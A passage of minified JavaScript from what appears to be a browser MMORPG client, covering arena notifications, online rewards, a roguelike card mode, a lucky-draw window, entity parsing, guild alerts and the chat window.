,t.EQUIP_POS_TO_SUB[o.EquipPos.EquipType_SecretRecord]=21,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsRat]=22,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsCow]=23,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsTiger]=24,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsRabbit]=25,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsDragon]=26,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsSnake]=27,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsHorse]=28,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsSheep]=29,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsMonkey]=30,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsChicken]=31,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsDog]=32,t.EQUIP_POS_TO_SUB[o.EquipPos.AnimalsPig]=33,t.EQUIP_POS_TO_SUB[o.EquipPos.Spell]=34,t.EQUIP_POS_TO_SUB[o.EquipPos.Bugle]=35,t.MASTER_EQUIP_POS_TO_SUB=[],t.MASTER_EQUIP_POS_TO_SUB[0]=46,t.MASTER_EQUIP_POS_TO_SUB[1]=47,t.MASTER_EQUIP_POS_TO_SUB[2]=48,t.MASTER_EQUIP_POS_TO_SUB[3]=49}(n=e.ForgeConst||(e.ForgeConst={})),window.ForgeConst=n,window.ForgeConst=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaRedPoint=void 0;var n=i(14),o=i(47),s=i(0),a=i(7),r=i(26),l=function(t){function e(){var e=t.call(this)||this;return e.redpoint=0,e.redpoint_1=0,e.redpoint_2=0,e.joinState=0,e.JoinRedPoint=[],e.redpoint_3=0,observe(e,e.postRedPoint,e.postRedPoint_1,e.postRedPoint_2),observe(e,e.postRedPoint_1,o.KfArenaSys.ins().postOpenKfArena,o.KfArenaSys.ins().postPlayerInfo),observe(e,e.postRedPoint_2,o.KfArenaSys.ins().postOpenKfArena,o.KfArenaSys.ins().postJoinRewards),e}return __extends(e,t),e.prototype.postRedPoint=function(){return this.redpoint=this.redpoint_1+this.redpoint_2+this.redpoint_3,this.redpoint},e.prototype.postRedPoint_1=function(){return this.redpoint_1=0,o.KfArenaSys.ins().isOpen()?(this.redpoint_1=o.KfArenaSys.ins().times,this.redpoint_1):0},e.prototype.postRedPoint_2=function(){this.redpoint_2=this.redpoint_3=0,this.joinState=0,this.JoinRedPoint=[];var t=o.KfArenaSys.ins();if(!(s.GlobalConfig.CrossArenaBase.openDay>a.GameServerCC.serverOpenDay+1||r.ZsCT.ins().lv<s.GlobalConfig.CrossArenaBase.zhuanshengLevel)&&t.isServerOpen){var e=s.GlobalConfig.CrossArenaBase.peakAwards,i=1,n=0,l=t.dflState;for(var h in e)1!=(l>>i&1)&&o.KfArenaSys.ins().dflCount>=e[h].count&&n++,1!=(l>>i&1)&&t.dflCount>=e[h].count?this.JoinRedPoint[i]=1:this.JoinRedPoint[i]=0,i++;this.redpoint_2=n,this.redpoint_3=0==o.KfArenaSys.ins().dailyState?1:0,this.joinState=0==o.KfArenaSys.ins().dailyState?1:2}},e.ins=function(){return t.ins.call(this)},__decorate([post()],e.prototype,"postRedPoint",null),__decorate([post()],e.prototype,"postRedPoint_1",null),__decorate([post()],e.prototype,"postRedPoint_2",null),e}(n.BaseSystem);e.KfArenaRedPoint=l,window.KfArenaRedPoint=l,__reflect(l.prototype,"KfArenaRedPoint",[]),Systemap.KfArenaRedPoint=function(){return l.ins()},window.KfArenaRedPoint=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OtherCT=void 0;var n=i(14),o=i(4),s=i(8),a=i(7),r=i(37),l=i(20),h=i(82),u=i(74),p=i(17),d=i(0),c=i(102),f=i(63),g=function(t){function e(){var e=t.call(this)||this;return e.worldLevel=0,e.nowTime=0,e.OnlineAwardResult=0,e.isHasTime=!1,e.sysId=PackageID.LianJi,e.regNetMsg(18,e.patchChangeCamp),e.regNetMsg(19,e.postYBCardTime),e.regNetMsg(21,e.patchWorldLevel),e.regNetMsg(22,e.syncCamp),e.regNetMsg(26,e.updateOnlineAward),e.initRps(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initLogin=function(){c.KFServerSys.ins().isWgClose&&(console.log("wgClose==2"),c.KFServerSys.ins().isWgClose=0,f.WarnCT.ins().setWarnLabel(gettext("检测到非法操作，返回本服"),null,null,"sure","center",!1,null))},e.prototype.closeFun=function(){console.log("wgClose==1")},e.prototype.sendPFVipInfo=function(){var t=this.getBytes(13);t.writeInt(+urlParam.appid),t.writeByte(o.ActorCC.myPFVipInfo.pfVip),t.writeByte(o.ActorCC.myPFVipInfo.pfVipSuper),t.writeByte(o.ActorCC.myPFVipInfo.pfVipYear),t.writeShort(o.ActorCC.myPFVipInfo.pfLv),this.sendToServer(t)},e.prototype.postYBCardTime=function(t){if(t){this.doubleYBCardTime=s.DateUtils.formatMiniDateTime(t.readUnsignedInt());var i=Math.max(0,this.doubleYBCardTime-a.GameServerCC.serverTime);i>0&&Timer.start(i,1,function(){e.ins().postYBCardTime(null)},this)}},e.prototype.patchChangeCamp=function(t){if(t){var e=t.readDouble(),i=t.readByte(),n=r.EntityManager.ins().getEntityByHandle(e);n&&n.data&&n.data.setCampModel(i)}},e.prototype.patchWorldLevel=function(t){this.worldLevel=t.readInt()},e.prototype.syncCamp=function(t){if(t){var e=t.readDouble(),i=t.readInt(),n=r.EntityManager.ins().getEntityByHandle(e);n&&n.data&&(n.data.camp=i,n.data.isMy&&l.GameMap.checkIsInInvade()&&(h.InvadeCT.ins().myCampId=i),n.data.isMy&&l.GameMap.checkIsInShouLei()&&(u.ContestCT.ins().myCampId=i),n.data.isMy&&l.GameMap.checkIsInDominate()&&(u.ContestCT.ins().myCampId=i))}},Object.defineProperty(e.prototype,"hasDouble",{get:function(){return this.doubleYBCardTime>0&&this.doubleYBCardTime>a.GameServerCC.serverTime},enumerable:!1,configurable:!0}),e.prototype.sendOnlineId=function(t){var e=this.getBytes(26);e.writeByte(t),this.sendToServer(e)},e.prototype.updateOnlineAward=function(t){this.nowTime=t.readInt(),this.OnlineAwardResult=t.readInt(),this.updateOnlineAwardResult(),Timer.stop(this.setTimeAdd,this),Timer.start(1e3,-1,this.setTimeAdd,this)},e.prototype.updateOnlineAwardResult=function(){},e.prototype.initRps=function(){var t=this;this.onlineAwardRed=new p.RedPoint(function(){var e=d.GlobalConfig.OnlineAwardsCfg;if(e)for(var i in e){var n=e[i],o=t.judgeAward(n.id),s=t.judgeEnTime(n.online);if(o&&s)return!0}return!1},this.updateOnlineAwardResult,this.updateAwards)},e.prototype.judgeAward=function(t){return this.OnlineAwardResult>>t&1?!1:!0},e.prototype.judgeEnTime=function(t){return this.nowTime>=60*t?!0:!1},e.prototype.setTimeAdd=function(){this.isGetAll()&&Timer.stop(this.setTimeAdd,this),this.nowTime++;var t=this.MathValueOfTimes();0!=t||e.ins().isGetAll()||this.isHasTime&&this.updateAwards()},e.prototype.isGetAll=function(){var t=d.GlobalConfig.OnlineAwardsCfg,e=!0;if(t)for(var i in t){var n=t[i],o=this.judgeAward(n.id);o&&(e=!1)}return e},e.prototype.MathValueOfTimes=function(){var t=e.ins().nowTime,i=d.GlobalConfig.OnlineAwardsCfg,n=0;if(this.isHasTime=!1,i)for(var o in i){var s=60*i[o].online;if(s>=t){n=s-t,this.isHasTime=!0;break}}return n},e.prototype.updateAwards=function(){},__decorate([post()],e.prototype,"postYBCardTime",null),__decorate([post()],e.prototype,"patchChangeCamp",null),__decorate([post()],e.prototype,"patchWorldLevel",null),__decorate([post()],e.prototype,"syncCamp",null),__decorate([post()],e.prototype,"updateOnlineAwardResult",null),__decorate([post()],e.prototype,"updateAwards",null),e}(n.BaseSystem);e.OtherCT=g,window.OtherCT=g,__reflect(g.prototype,"OtherCT",[]),Systemap.OtherCT=function(){return g.ins()},window.OtherCT=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RogueCT=void 0;var n=i(14),o=i(0),s=i(20),a=i(449),r=i(450),l=i(451),h=function(t){function e(){var e=t.call(this)||this;return e.dataArr=[],e.canGetTelentArr=[],e.playAttArr=[],e.selectCardArr=[],e.nowHasSelectCard=[],e.rogueTalentIsOpen=!1,e.rogueSelectCard=!1,e.selectCardCount=0,e.mosterIdx=0,e.sysId=PackageID.GameOpen,e.regNetMsg(1,e.postGoneData),e.regNetMsg(2,e.postPassData),e.regNetMsg(12,e.postPassRodamAttData),e.regNetMsg(14,e.postPassCardAttData),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.isOpenRogue=function(){var t=o.GlobalConfig.OpenGameBaseCfg;if(t&&urlParam.appid&&t.appId)for(var e in t.appId)if(t.appId[e]==urlParam.appid){var i=s.GameMap.fubenID,n=o.GlobalConfig.InstanceConfig[i];if(n&&n.gameId)return!0}return!1},e.prototype.postGoneData=function(t){var e=t.readShort();this.dataArr=[];for(var i=0;e>i;i++){var n=t.readShort();this.dataArr.push(n)}this.updateOpenData()},e.prototype.updateOpenData=function(){},e.prototype.sendPassById=function(t){var e=this.getBytes(2);e.writeShort(t),this.sendToServer(e)},e.prototype.postPassData=function(t){var e=t.readShort();switch(e){case 1:var i=t.readByte();this.canGetTelentArr=[];for(var n=0;i>n;n++){var o=t.readShort();this.canGetTelentArr.push(o)}this.canGetTelentArr.length>0&&this.openRogueTalentWin()}},e.prototype.openRogueTalentWin=function(){win.open(l.RogueTalentWin)},e.prototype.sendPassSlectTelent=function(t){var e=this.getBytes(11);e.writeByte(t.length);for(var i=0;i<t.length;i++)e.writeShort(t[i]);this.sendToServer(e);for(var i in t)this.nowHasSelectCard.push(t[i])},e.prototype.sendType1RodamAtt=function(){var t=this.getBytes(12);this.sendToServer(t)},e.prototype.postPassRodamAttData=function(t){var i=t.readByte();i>0&&(this.playAttArr=[]);for(var n=0;i>n;n++){var o=t.readShort(),s=t.readInt(),r={id:o,value:s};this.playAttArr.push(r)}e.ins().rogueTalentIsOpen||(win.close(l.RogueTalentWin),e.ins().rogueTalentIsOpen=!0,win.open(a.RogueAttributeWin))},e.prototype.sendType1ComeFb=function(){var t=this.getBytes(13);this.sendToServer(t),e.ins().rogueTalentIsOpen=!1,win.close(a.RogueAttributeWin)},e.prototype.sendType1CardAtt=function(){var t=this.getBytes(14);t.writeByte(this.selectCardArr.length);for(var i=0;i<this.selectCardArr.length;i++)t.writeByte(this.selectCardArr[i].indx),t.writeShort(this.selectCardArr[i].id),t.writeByte(this.selectCardArr[i].place);if(this.sendToServer(t),this.isSetCardPlace()){this.selectCardCount++;for(var i in this.selectCardArr)this.nowHasSelectCard.push(this.selectCardArr[i].id);e.ins().rogueSelectCard=!1,win.close(r.RogueCardSelect)}},e.prototype.updateCardData=function(){},e.prototype.postPassCardAttData=function(t){var i=t.readByte();this.selectCardArr=[];for(var n=0;i>n;n++){var o=t.readByte(),s=t.readShort(),a=t.readByte(),l={indx:o,id:s,place:a};this.selectCardArr.push(l)}this.mosterIdx=t.readByte(),this.updateCardData(),e.ins().rogueSelectCard||(e.ins().rogueSelectCard=!0,win.open(r.RogueCardSelect))},e.prototype.isSetCardPlace=function(){if(this.selectCardArr.length>0)for(var t in this.selectCardArr)if(0==this.selectCardArr[t].place)return!1;return!0},e.prototype.returnIsOpen=function(t){for(var e in this.dataArr)if(+this.dataArr[e]==t)return!0;return!1},e.prototype.returnAttrById=function(t){for(var e in this.playAttArr)if(this.playAttArr[e].id==t)return this.playAttArr[e].value;return null},e.prototype.setSlectCardDataByIndex=function(t,e){for(var i in this.selectCardArr)this.selectCardArr[i].indx==t&&(this.selectCardArr[i].place=e);this.updateCardData()},e.prototype.returnSlectPlace=function(){var t=0;for(var e in this.selectCardArr)1==this.selectCardArr[e].place&&t++;return t},__decorate([post()],e.prototype,"updateOpenData",null),__decorate([delayCall(500)],e.prototype,"openRogueTalentWin",null),__decorate([post()],e.prototype,"updateCardData",null),e}(n.BaseSystem);e.RogueCT=h,window.RogueCT=h,__reflect(h.prototype,"RogueCT",[]),Systemap.RogueCT=function(){return h.ins()},window.RogueCT=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LuckyResultWin=void 0;var n=i(18),o=i(5),s=i(1),a=i(11),r=i(0),l=i(4),h=i(6),u=i(2),p=i(111),d=i(9),c=window.cc_launchX=180;window.cc_launchX=c;var f=window.cc_launchY=500;window.cc_launchY=f;var g=window.cc_firstX=0;window.cc_firstX=g;var m=window.cc_firstY=0;window.cc_firstY=m;var v=window.cc_distantX=77;window.cc_distantX=v;var y=window.cc_distantY=93;window.cc_distantY=y;var C=window.cc_depotX=320;window.cc_depotX=C;var T=window.cc_depotY=620;window.cc_depotY=T;var b=window.cwaitTime=50;window.cwaitTime=b;var w=function(t){function e(){var e=t.call(this)||this;return e.arr=[],e.items=[],e.type=0,e}return __extends(e,t),e.prototype.initUI=function(){this.skinName="HuntResult",t.prototype.initUI.call(this)},e.prototype.open=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.buyBtn,this.buy),this.observe(d.Activity.ins().postRewardResult,this.updateView),this.activityID=t[0],this.indexs=t[1],this.updateView()},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.updateView=function(){this.canClicck=!0,this.zwHunt.visible=!0;var t,e;if(e=r.GlobalConfig.ActivityType9Config,t=d.Activity.ins().activityData[this.activityID],this.indexs.length>1){var i=e[this.activityID];this.arr=[];for(var n=0;n<this.indexs.length;n++)if(this.indexs[n])for(var o=0;o<i[this.indexs[n]].reward.length;o++)this.arr.push(i[this.indexs[n]].reward[o]);this.title.text=gettext("获得如下宝物"),this.buyBtn.labelDisplay.text=gettext("抽{0}次",10),this.yb=10*i[0].yb,this.zw.text=this.yb+"";var s=r.GlobalConfig.ItemConfig[i[0].item];this.icon.source=s?s.icon+"_png":null,this.itemId=i[0].item,this.updateDesc(),this.playResult(),this.zwNum2.text="/10）"}else if(t.indexsEx.length){var i=e[this.activityID];this.arr=[];for(var n=0;n<t.indexsEx.length;n++)if(t.indexsEx[n])for(var o=0;o<i[t.indexsEx[n]].reward.length;o++)this.arr.push(i[t.indexsEx[n]].reward[o]);this.title.text=gettext("获得如下宝物"),this.buyBtn.labelDisplay.text=gettext("抽{0}次",1),this.yb=1*i[0].yb,this.zw.text=this.yb+"";var s=r.GlobalConfig.ItemConfig[i[0].item];this.icon.source=s?s.icon+"_png":null,this.itemId=i[0].item,this.updateDesc(),this.playResult(),this.zwNum2.text="/1）"}},e.prototype.updateDesc=function(){var t=h.BagCT.ins().getBagItemById(this.itemId),e=n.ColorUtil.WHITE_COLOR,i=0,s=10;t&&(i=t.count,e=t.count>=s?n.ColorUtil.GREEN_COLOR:n.ColorUtil.RED_COLOR),this.zwNum1.textFlow=o.TextFlowMaker.generateTextFlow("<font color="+e+">"+i+"</font> ")},e.prototype.playResult=function(t){var e=this;this.releaseAllItem();for(var i=this.arr.length,n=0;i>n;n++){this.items[n]=this.createItem(this.arr[n]);var o=egret.Tween.get(this.items[n]);this.items[n].x=n%5*v+g,this.items[n].y=Math.floor(n/5)*y+m,this.items[n].alpha=0,o.wait(n*b).to({alpha:1},200).call(function(){i--,0==i&&(void 0!=t&&t(),e.canClicck=!0)})}},e.prototype.playGet=function(t){for(var e=this,i=this.arr.length,n=0;i>n;n++)if(this.items[n]){var o=egret.Tween.get(this.items[n]);o.to({y:T,x:C,scaleX:0,scaleY:0},300-50*Math.floor(n/5)).call(function(){i--,0==i&&(void 0!=t&&t(),e.releaseAllItem())})}},e.prototype.createItem=function(t){var e=new a.ItemBase;this.listCon.addChild(e);var i=r.GlobalConfig.ItemConfig[t.id];return i?(e.num=t.count,e.data=t):e.data={type:0,count:t.count,id:t.id},e.x=c,e.y=f,e},e.prototype.releaseAllItem=function(){for(var t in this.items)this.items[t].destruct(),this.listCon.removeChild(this.items[t]);this.items=[]},e.prototype.buy=function(t){if(this.canClicck){var e;if(this.ins=d.Activity.ins(),this.config9=r.GlobalConfig.ActivityType9Config,e=d.Activity.ins().activityData[this.activityID],this.indexs.length>1){var i=this.config9[this.activityID][0],n=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,i.item);if(n&&n.count)this.ins.sendReward(this.activityID,2);else{var o=10,s=gettext("是否消耗{0}元宝购买{1}*{2}",i.yb*o,r.GlobalConfig.ItemConfig[i.item].name,o);p.HuntWarnBuyWin.showBuyWarn("LuckyResultWin"+this.activityID+"-10",this.huntWarnFun.bind(this),s)}}else{var i=this.config9[this.activityID][0],n=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,i.item);if(n&&n.count)this.ins.sendReward(this.activityID,1),this.ins.sendReward(this.activityID,1);else{var o=1,s=gettext("是否消耗{0}元宝购买{1}*{2}",i.yb*o,r.GlobalConfig.ItemConfig[i.item].name,o);p.HuntWarnBuyWin.showBuyWarn("LuckyResultWin"+this.activityID+"-1",this.huntWarnFun.bind(this),s)}}}},e.prototype.huntWarnFun=function(){var t=this.config9[this.activityID][0],e=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,t.item);this.indexs.length>1?(e&&e.count&&this.ins.sendReward(this.activityID,2),l.ActorCC.yb>=10*t.yb?this.ins.sendReward(this.activityID,2):u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"))):e&&e.count?(this.ins.sendReward(this.activityID,1),this.ins.sendReward(this.activityID,1)):l.ActorCC.yb>=1*t.yb?(this.ins.sendReward(this.activityID,1),this.ins.sendReward(this.activityID,1)):u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"))},e}(s.BaseView);e.LuckyResultWin=w,window.LuckyResultWin=w,__reflect(w.prototype,"LuckyResultWin",[]),window.LuckyResultWin=w},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EntityModel=void 0;var n=i(276),o=i(0),s=i(4),a=i(13),r=i(34),l=i(102),h=i(31),u=i(100),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.isElite=!1,e.attributeData={},e.killNum=0,e.isMy=!1,e.weaponsId=0,e.isWander=!1,e.lyMarkLv=0,e.lyMarkSkills=[],e.isClient=!1,e.hpHeight=130,e.changeNum=0,e}return __extends(e,t),e.prototype.parser=function(t){this.parserBase(t),this.type!=EntityType.Fire&&(this.parserAtt(t),this.type==EntityType.Ring?this.parserLyMark(t):(this.type==EntityType.Monster||this.type==EntityType.Pet)&&(this._scale=t.readInt(),this.hpHeight=(130+t.readInt())*this.avatarScale,this.parserbelong(t),this.camp=t.readInt()))},e.prototype.parserLyMark=function(t){this.lyMarkLv=t.readShort(),this.lyMarkSkills=[];var e=t.readByte();this.lyMarkSkills.length=e;for(var i=0;e>i;i++)this.lyMarkSkills[i]=t.readShort()},e.prototype.parserbelong=function(t){this.belongHandle=t.readDouble(),this.belongName=t.readString()},e.prototype.parserBase=function(t){this.type=t.readShort(),this.handle=t.readDouble(),this.configID=t.readInt(),this.masterHandle=t.readDouble();var e=t.readShort(),i=t.readShort(),n=1,s=o.GlobalConfig.MonstersConfig[this.configID];s&&(this.effect=s.effect,n=s.size||1),this.x=u.mainfightcc.gridToX(e,n),this.y=u.mainfightcc.gridToY(i,n),this.gridX=e,this.gridY=i},Object.defineProperty(e.prototype,"masterHandle",{get:function(){return this._masterHandle},set:function(t){this._masterHandle=t,this.isMy=this.checkHandleIsMy(t)},enumerable:!1,configurable:!0}),e.prototype.checkHandleIsMy=function(t){if(t==s.ActorCC.handle)return!0;for(var e=a.SubRoles.ins().roles,i=0,n=e;i<n.length;i++){var o=n[i];if(o.handle==t)return!0}return!1},e.prototype.parserAtt=function(t){for(var e=t.readByte(),i=0;e>i;i++)this.setAtt(t.readUnsignedByte(),t.readDouble())},e.prototype.getAtt=function(t){return this.attributeData[t]||0},e.prototype.getAttS=function(){return this.attributeData},e.prototype.setAtt=function(t,e){(2==t||0==t&&this.attributeData[t]!=e)&&(this.changeNum=this.attributeData[t]),this.attributeData[t]=e},Object.defineProperty(e.prototype,"avatarFileName",{get:function(){return this.avatar.toString()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"weaponFileName",{get:function(){return""},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"avatar",{get:function(){return this._avatar||o.GlobalConfig.MonstersConfig[this.configID].avatar},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"name",{get:function(){return this._name||o.GlobalConfig.MonstersConfig[this.configID].name},set:function(t){this._name=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"nameColor",{get:function(){var t,e=null===(t=o.GlobalConfig.MonstersConfig[this.configID])||void 0===t?void 0:t.quality;return e?h.QUALITY_COLOR[e]:0},enumerable:!1,configurable:!0}),e.prototype.getServerName=function(){return this._servShowId},e.prototype.getNameWithServer=function(){return this._servShowId&&l.KFServerSys.ins().isKF?this.name+("S"+this._servShowId):this.name},e.prototype.getDir=function(){var t=o.GlobalConfig.MonstersConfig[this.configID];if(!t)return-1;var e=o.GlobalConfig.MonstersConfig[this.configID].dir;return isNaN(e)?-1:e},Object.defineProperty(e.prototype,"dirNum",{get:function(){var t=o.GlobalConfig.MonstersConfig[this.configID];return t&&(this._dirNum=0/0,t.dirNum)?t.dirNum:this._dirNum?this._dirNum:2},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"avatarScale",{get:function(){var t=this._scale||o.GlobalConfig.MonstersConfig[this.configID].scale;return t?t/100:1},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"movePara",{get:function(){return o.GlobalConfig.YouDangConfig[this.wandertime]&&this.wanderrange?[this.wanderrange,o.GlobalConfig.YouDangConfig[this.wandertime].fileName]:null},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"lv",{get:function(){return o.GlobalConfig.MonstersConfig[this.configID].level},set:function(t){this._lv=t},enumerable:!1,configurable:!0}),e.prototype.setPos=function(t,e){this.x=t,this.y=e},e.prototype.publicCD=function(){return 1e6/(this.getAtt(r.AttributeType.atAttackSpeed)*(1+this.getAtt(r.AttributeType.atAttackSpeedPower)/1e4))},e.prototype.getHpState=function(){return this.isMy?"g":"r"},e}(n.NpcModel);e.EntityModel=p,window.EntityModel=p,__reflect(p.prototype,"EntityModel",[]),window.EntityModel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DirUtil=void 0;var n=i(70),o=function(){function t(){}return t.get8DirBy2Point=function(t,e){var i=n.MathUtils.getAngle(n.MathUtils.getRadian2(t.x,t.y,e.x,e.y));return this.angle2dir(i)},t.get4DirBy2Point=function(t,e){return t.x<e.x?t.y<e.y?3:1:t.y<e.y?5:7},t.dir2angle=function(t){return t*=45,t-=90},t.angle2dir=function(t){return-90>t&&(t+=360),Math.round((t+90)/45)%8},t.dirOpposit=function(t){return 4>t?t+4:t-4},t.get5DirBy8Dir=function(t){return t-this.isScaleX(t)},t.get4DirBy8Dir=function(t){return 7==t||1==t?0:5==t||3==t?4:t},t.isScaleX=function(t){var e=2*(t-4);return 0>e&&(e=0),e},t.getGridByDir=function(t,e,i){void 0===e&&(e=1),void 0===i&&(i={x:0,y:0});var o=this.dir2angle(this.dirOpposit(t)),s=n.MathUtils.getDirMove(o,64*e,i.x,i.y);return s.x=64*Math.floor(s.x/64)+32,s.y=64*Math.floor(s.y/64)+32,s},t}();e.DirUtil=o,window.DirUtil=o,__reflect(o.prototype,"DirUtil",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildRP=void 0;var n=i(14),o=i(28),s=i(6),a=i(0),r=i(17),l=i(4),h=function(t){function e(){var e=t.call(this)||this;return e.rp=new r.RedPoint,e.memberRp=new r.RedPoint,e.initRps(),e}return __extends(e,t),e.prototype.initRps=function(){var t=this;this.fireRp=new r.RedPoint(function(){return t.checkFireRp()},s.BagCT.ins().postItemAdd,s.BagCT.ins().postItemDel,o.Guild.ins().postQuitGuild,o.Guild.ins().postUpdateFire),this.applyRp=new r.RedPoint(function(){return o.Guild.ins().hasApplys()},o.Guild.ins().postJoinGuild,o.Guild.ins().postQuitGuild,o.Guild.ins().postApplyInfos),this.mtabDonate=new r.RedPoint(function(){return o.Guild.ins().hasDonate()},o.Guild.ins().postMyGuildInfo,o.Guild.ins().postQuitGuild,o.Guild.ins().postConCount),this.mtabUp=new r.RedPoint(function(){return o.Guild.ins().isUpGradeBuilding()},o.Guild.ins().postUpBuilding,o.Guild.ins().postManageList,o.Guild.ins().postGuildMoney,o.Guild.ins().postQuitGuild,o.Guild.ins().postMyGuildInfo),this.memberRp.addSub(this.mtabDonate),this.memberRp.addSub(this.mtabUp),this.rp.addSub(this.fireRp),this.rp.addSub(this.applyRp),this.rp.addSub(this.memberRp)},e.prototype.checkFireRp=function(){if(l.ActorCC.level<a.GlobalConfig.GuildConfig.openLevel||0==l.ActorCC.guildId)return!1;var t=a.GlobalConfig.GuildConfig,e=s.BagCT.ins().getBagItemById(t.bonfireItem);return e&&e.count>=(t.bonfirecaution||1)?!0:!1},e}(n.BaseSystem);e.GuildRP=h,window.GuildRP=h,__reflect(h.prototype,"GuildRP",[]),Systemap.GuildRP=function(){return h.ins()},window.GuildRP=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatWin=void 0;var n=i(24),o=i(1),s=i(277),a=i(4),r=i(32),l=i(23),h=i(28),u=i(275),p=i(2),d=i(27),c=i(45),f=i(120),g=i(138),m=i(164),v=i(12),y=i(15),C=i(20),T=i(7),b=i(182),w=i(163),I=i(93),_=i(649),S=function(t){function e(){var e=t.call(this)||this;return e._sn_="ChatSkin",e.defaultRect=!1,e.layoutNum=LayoutNum.top,e.cruIndex=0,e.fistOpenGuild=!0,e.firstShow=!0,e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return c.ChatCT.ins().isCheckOpen()?v.OpenSystem.ins().checkSysOpen(y.SystemType.CHAT):!0},e.prototype.skinComplete=function(){this.defaultText=gettext("点击输入咨询内容"),this.chatInput.maxChars=0,this.input.maxChars=100,this.tabData=new eui.ArrayCollection,this.tab.dataProvider=this.tabData,this.chatList.touchEnabled=!1,I.Friends.ins().sendBlackList()},e.prototype.refTab=function(){var t=[];r.FbCT.ins().isFBChatChannle()?t=[gettext("阵营")]:(T.GameServerCC.isKf?C.GameMap.fbType==r.FbCT.FB_KF||C.GameMap.fbType==r.FbCT.FB_TYPE_DEVILDOM_BOSS?(t=[gettext("综合"),gettext("跨服"),gettext("行会")],e.Channel_All=0,e.Channel_World=100,e.Channel_KuaFu=1,e.Channel_Guild=2,e.Channel_SYS=3,e.Channel_AI=4,e.Channel_KF=5):(t=[gettext("综合"),gettext("世界"),gettext("跨服"),gettext("行会")],e.Channel_All=0,e.Channel_World=1,e.Channel_KuaFu=2,e.Channel_Guild=3,e.Channel_SYS=4,e.Channel_AI=5,e.Channel_KF=6):C.GameMap.fbType!=r.FbCT.FB_KF&&C.GameMap.fbType!=r.FbCT.FB_TYPE_DEVILDOM_BOSS?(t=[gettext("综合"),gettext("世界"),gettext("行会")],e.Channel_All=0,e.Channel_World=1,e.Channel_KuaFu=100,e.Channel_Guild=2,e.Channel_SYS=3,e.Channel_AI=4,e.Channel_KF=5):(t=[gettext("综合"),gettext("跨服"),gettext("行会")],e.Channel_All=0,e.Channel_World=100,e.Channel_KuaFu=1,e.Channel_Guild=2,e.Channel_SYS=3,e.Channel_AI=4,e.Channel_KF=5),"0"!=urlParam.kf&&(t.push(gettext("系统")),C.GameMap.checkIsKf()||t.push(gettext("客服")))),this.tabData.replaceAll(t),this.tab.validateNow()},e.prototype.addDisplay=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];
"7000183"==urlParam.appid&&window.mz?(this.chatInputGroup.touchChildren=this.chatGroup.touchChildren=!1,this.chatInputGroup.touchEnabled=this.chatGroup.touchEnabled=!0):(this.chatInputGroup.touchChildren=this.chatGroup.touchChildren=!0,this.chatInputGroup.touchEnabled=this.chatGroup.touchEnabled=!1),0==this.input.text.length?(this.input.text=this.defaultText,this.input.textColor=7105644):this.input.textColor=14668213,this.addTouchEvent(this,this.onTap),this.addTouchEvent(this.chatList,this.onListTap),observe(this,this.getNewOne,c.ChatCT.ins().postNewChatMsg),this.chatInput.addEventListener(egret.FocusEvent.FOCUS_IN,this.textInOn,this),observe(this,this.textInOn,c.ChatCT.ins().postSendInfoSuccess),this.addChangeEvent(this.tab,this.selectIndexChange),this.addChangingEvent(this.tab,this.checkIsOpen),this.input.addEventListener(egret.FocusEvent.FOCUS_IN,this.updateInput,this),observe(this,this.getNewOneGuild,h.Guild.ins().postGetNewGuildMessage),observe(this,this.uptateKFChat,c.ChatCT.ins().postKfChatMsg),observe(this,this.updataList,h.Guild.ins().postAllGuildMessage),observe(this,this.updateMsgRedPoint,h.Guild.ins().postQuitGuild,Ts.enterScene.enterOK),observe(this,this.updateInputText,l.GameLogic.ins().postInputText),observe(this,this.updateKeFuText,l.GameLogic.ins().postInputText),this.cruIndex!=e.Channel_Guild||h.Guild.ins().guildID?this.cruIndex>e.Channel_Guild&&(this.cruIndex=0):this.cruIndex=0,t&&(this.cruIndex=t[0]),this.refTab(),this.backSelect(this.cruIndex),this.selectIndexChange(null),this.addDataProviderEvent()},e.prototype.addDataProviderEvent=function(){this.chatList.dataProvider&&this.chatList.dataProvider.addEventListener(eui.C